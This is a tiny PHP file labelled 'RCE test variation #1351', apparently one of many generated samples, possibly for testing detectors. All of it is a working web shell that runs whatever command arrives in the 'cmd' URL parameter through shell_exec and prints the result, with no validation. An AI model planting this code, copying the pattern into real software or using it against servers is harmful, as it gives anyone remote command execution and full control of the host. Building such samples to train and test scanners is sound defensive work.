<?php
// RCE test variation #1351
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>